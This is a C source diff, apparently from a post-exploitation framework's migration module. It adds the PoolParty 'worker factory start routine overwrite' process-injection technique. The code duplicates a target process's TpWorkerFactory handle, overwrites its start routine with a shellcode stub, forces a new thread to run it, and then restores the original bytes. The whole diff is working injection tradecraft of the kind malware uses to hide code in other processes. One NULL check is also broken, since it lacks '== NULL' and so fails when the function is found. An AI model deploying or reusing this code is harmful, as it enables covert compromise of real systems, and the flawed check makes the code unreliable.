@@ -47,6 +47,19 @@ NtDll* GetOrInitNtDll() {
 		}
 		dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwSetIoCompletion: %p", pNtDll->pZwSetIoCompletion);
 
+		pNtDll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory");
+		pNtDll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory");
+
+		if (pNtDll->pNtQueryInformationWorkerFactory == NULL || pNtDll->pNtSetInformationWorkerFactory) {
+			bError = TRUE;
+			break;
+		}
+
+		dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationWorkerFactory = %p && NtSetInformationWorkerFactory = %p", pNtDll->pNtQueryInformationWorkerFactory, pNtDll->pNtSetInformationWorkerFactory);
+		if (poolLifeguard != NULL) {
+			poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported = TRUE;
+		}
+
 		//ntdll->pZwAssociateWaitCompletionPacket = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR, PBOOLEAN))GetProcAddress(hNtDll, "ZwAssociateWaitCompletionPacket");
 		//if (ntdll->pZwAssociateWaitCompletionPacket != NULL) {
 		//	if (poolLifeguard != NULL) {
@@ -105,9 +118,12 @@ POOLPARTY_INJECTOR* GetOrInitPoolParty(DWORD dwSourceArch, DWORD dwDestinationAr
 			}
 			poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isSystemSupported;
 		}
+		if ((dwSourceArch == PROCESS_ARCH_X64 && dwDestinationArch == PROCESS_ARCH_X64) || (dwSourceArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X86)) {
+			poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported;
+		}
 		poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].handler = remote_tp_direct_insertion;
 		// poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].handler = remote_tp_wait_insertion;
-		// poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].handler = worker_factory_start_routine_overwrite;
+		poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].handler = worker_factory_start_routine_overwrite;
 		poolLifeguard->init = TRUE;
 
 	}while(0);
@@ -247,6 +263,76 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 	if(lpDirect != NULL) {
 		HeapFree(hHeap, 0, lpDirect);
 	}
+	return dwResult;
+}
+
+DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
+	DWORD dwResult = 0x1337; // just a random value to change later.
+	do {
+		GetOrInitNtDll();
+		if (pNtDll == NULL) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] GetOrInitNtDll failed.", ERROR_INVALID_FUNCTION); // I am not sure about what ERROR to return for all BREAK_WITH_ERROR calls.
+		}
+		if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] This variant isn't supported on the current system.", ERROR_NOT_SUPPORTED);
+		}
+		HANDLE hDuplicatedHandle = GetRemoteHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
+		if (hDuplicatedHandle == INVALID_HANDLE_VALUE) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Couldn't find TpWorkerFactory object in the target process or couldn't duplicate the found TpWorkerFactory object", ERROR_NOT_SUPPORTED);
+		}
+		WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryBasicInfo = { 0 };
+		ULONG ReturnLength = 0;
+		dwResult = pNtDll->pNtQueryInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryBasicInformation,&WorkerFactoryBasicInfo,sizeof(WORKER_FACTORY_BASIC_INFORMATION),&ReturnLength);
+		dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtQueryInformationWorkerFactory returned 0x%x && ReturnLength = %lu", dwResult, ReturnLength);
+		if (dwResult != STATUS_SUCCESS || ReturnLength > sizeof(WORKER_FACTORY_BASIC_INFORMATION) || WorkerFactoryBasicInfo.StartRoutine == NULL) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtQueryInformationWorkerFactory failed.",ERROR_NOT_SUPPORTED);
+		}
+		unsigned char shellcode[16];
+		if (dwDestinationArch == PROCESS_ARCH_X64) {
+			unsigned char tmp[] = {
+			// this is a stub to call poolparty migration stub.
+			0xe8, 0x08, 0x00, 0x00, 0x00, // call  start
+			0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, // these will be changed with poolparty migration stub's memory address.
+			//start:
+			0x58, //pop rax
+			0xff, 0x10 //call [rax]
+			};
+			uintptr_t StubAddress = (uintptr_t)lpStartAddress;
+			memcpy(&tmp[5], &StubAddress, sizeof(StubAddress));
+			memcpy(&shellcode, &tmp, sizeof(tmp));
+		}
+		else {
+			unsigned char tmp[] = {
+				// this is a stub to call poolparty migration stub.
+				0xe8, 0x04, 0x00, 0x00, 0x00, // call  start
+				0x90,0x90,0x90,0x90, // these will be changed with poolparty migration stub's's memory address.
+				//start:
+				0x58, //pop eax
+				0xff, 0x10 //call [eax]
+			};
+			unsigned __int32 StubAddress = (unsigned __int32)((uintptr_t)lpStartAddress);
+			memcpy(&tmp[5], &StubAddress, sizeof(StubAddress));
+			memcpy(&shellcode, &tmp, sizeof(tmp));
+		}
+		unsigned char OriginalBytes[16] = { 0x00 };
+		if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), NULL)) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ReadProcessMemory failed.", ERROR_NOT_SUPPORTED);
+		}
+		
+		SIZE_T szWritten = 0;
+		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &shellcode, sizeof(shellcode), &szWritten) || szWritten != sizeof(shellcode)) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't write stub to WorkerFactory's start routine.", ERROR_NOT_SUPPORTED);
+		}
+		WorkerFactoryBasicInfo.ThreadMinimum++; //Increase minimum thread number to create a new thread.
+		dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
+		dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory returned 0x%x",dwResult);
+		if (dwResult != STATUS_SUCCESS) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory failed.", ERROR_NOT_SUPPORTED);
+		}
+		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), &szWritten) || szWritten != sizeof(OriginalBytes)) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't restore original bytes.", ERROR_NOT_SUPPORTED);
+		}
+	} while (0);
 	return dwResult;
 }
 
